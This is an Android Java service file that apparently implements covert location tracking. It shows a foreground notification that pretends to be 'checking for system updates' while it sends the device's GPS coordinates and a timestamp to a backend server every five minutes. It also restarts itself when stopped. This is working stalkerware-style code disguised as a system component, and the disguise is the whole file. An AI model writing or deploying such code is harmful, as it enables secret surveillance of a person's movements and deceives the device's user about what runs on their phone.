package com.example.systemupdate;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class BackgroundService extends Service {

    private static final String TAG = "SystemBackgroundService";
    // Replace with your deployed cloud backend URL later
    private static final String BACKEND_URL = "http://10.0.2.2:5000/api";
    private LocationManager locationManager;
    private LocationListener locationListener;

    @Override
    public void onCreate() {
        super.onCreate();
        startForegroundServiceNotification();
        setupLocationTracking();
    }

    private void startForegroundServiceNotification() {
        String channelId = "system_update_service_channel";
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                channelId,
                "System Update Sync",
                NotificationManager.IMPORTANCE_LOW
            );
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }

        Notification notification = new NotificationCompat.Builder(this, channelId)
            .setContentTitle("System Sync")
            .setContentText("Checking for system updates...")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build();

        startForeground(1, notification);
    }

    private void setupLocationTracking() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                sendLocationToServer(location.getLatitude(), location.getLongitude());
            }
            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {}
            @Override
            public void onProviderEnabled(String provider) {}
            @Override
            public void onProviderDisabled(String provider) {}
        };

        try {
            if (locationManager != null) {
                locationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    300000, // Every 5 minutes
                    10,     // 10 meters distance
                    locationListener
                );
            }
        } catch (SecurityException e) {
            Log.e(TAG, "No permission to track location: " + e.getMessage());
        }
    }

    private void sendLocationToServer(double latitude, double longitude) {
        new Thread(() -> {
            try {
                URL url = new URL(BACKEND_URL + "/device/upload/location");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; utf-8");
                conn.setDoOutput(true);

                String jsonInputString = String.format(
                    "{\"latitude\": %f, \"longitude\": %f, \"address\": \"\", \"timestamp\": \"%s\"}",
                    latitude,
                    longitude,
                    new java.util.Date().toString()
                );

                try (OutputStream os = conn.getOutputStream()) {
                    byte[] input = jsonInputString.getBytes(StandardCharsets.UTF_8);
                    os.write(input, 0, input.length);
                }

                int code = conn.getResponseCode();
                Log.d(TAG, "GPS location response code: " + code);
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Failed to upload GPS location: " + e.getMessage());
            }
        }).start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
